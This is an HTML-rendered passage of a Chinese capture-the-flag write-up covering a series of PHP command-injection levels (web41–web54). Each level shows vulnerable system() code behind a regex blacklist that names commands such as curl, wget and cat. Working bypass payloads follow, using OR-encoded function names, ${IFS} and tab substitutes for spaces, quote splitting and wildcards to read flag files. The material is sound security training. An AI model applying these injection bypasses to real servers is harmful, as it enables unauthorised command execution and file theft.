punctuation\">(</span><span class=\"token string double-quoted-string\">\"echo(<span class=\"token interpolation\"><span class=\"token variable\">$c</span></span>);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>过滤了很多字符，但是没有过滤 |，一般看到这种特别全的过滤都是过滤无参 rce, 使用或运算</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">256</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$j</span><span class=\"token operator\">&lt;</span><span class=\"token number\">256</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$j</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token operator\">.</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token operator\">.</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token variable\">$preg</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 题目的正则</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span><span class=\"token punctuation\">,</span><span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token class-name\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span><span class=\"token punctuation\">,</span><span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'%'</span><span class=\"token operator\">.</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'%'</span><span class=\"token operator\">.</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token class-name\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">32</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">126</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">c&#x3D;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%60%60&quot;|&quot;%0c%13&quot;)\nc&#x3D;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%60%60%60%00%60%60%60%60%00%60%60%60&quot;|&quot;%03%01%14%20%06%0c%01%07%2e%10%08%10&quot;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030134154287.png\" alt=\"image-20221030134154287\" /></p>\n<h2 id=\"web42\"><a class=\"anchor\" href=\"#web42\">#</a> web42</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>命令执行拼接了一个重定向，将后面的部分绕过即可</p>\n<p>用 %0a 或者；、&amp;、| 都可以绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030134733941.png\" alt=\"image-20221030134733941\" /></p>\n<h2 id=\"web43\"><a class=\"anchor\" href=\"#web43\">#</a> web43</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>增加了分号和 cat 的限制，打开文件的命令除去 cat 还有很多，上题提到的分隔符选一个没过滤的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135146874.png\" alt=\"image-20221030135146874\" /></p>\n<h2 id=\"web44\"><a class=\"anchor\" href=\"#web44\">#</a> web44</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/;|cat|flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>多了一个正则 flag，匹配符绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135449426.png\" alt=\"image-20221030135449426\" /></p>\n<h2 id=\"web45\"><a class=\"anchor\" href=\"#web45\">#</a> web45</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| /i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>增加了空格替换空格的方式很多</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;sort%09fl*||<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135834529.png\" alt=\"image-20221030135834529\" /></p>\n<h2 id=\"web46\"><a class=\"anchor\" href=\"#web46\">#</a> web46</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>增加了数字和 $*</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;tac&lt;fl&#39;&#39;ag.php||<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030140817538.png\" alt=\"image-20221030140817538\" /></p>\n<h2 id=\"web47\"><a class=\"anchor\" href=\"#web47\">#</a> web47</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>增加了几个打开文件的命令，但是没有完全过滤，tac 和 nl 都可以用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030141214369.png\" alt=\"image-20221030141214369\" /></p>\n<h2 id=\"web52\"><a class=\"anchor\" href=\"#web52\">#</a> web52</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>过滤增加了 &lt;&gt;，但是没有 $ 了，空格换一下能用的就行，flag 也换地方了</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;nl$&#123;IFS&#125;&#x2F;fla&#39;&#39;g||<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030144043709.png\" alt=\"image-20221030144043709\" /></p>\n<h2 id=\"web53\"><a class=\"anchor\" href=\"#web53\">#</a> web53</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$d</span> <span class=\"token operator\">=</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'no'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030150008909.png\" alt=\"image-20221030150008909\" /></p>\n<h2 id=\"web54\"><a class=\"anchor\" href=\"#web54\">#</a> web54</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">c&#x3D;&#x2F;bin&#x2F;c?t$&#123;IFS&#125;f???????<span aria-hidden=\"true\" 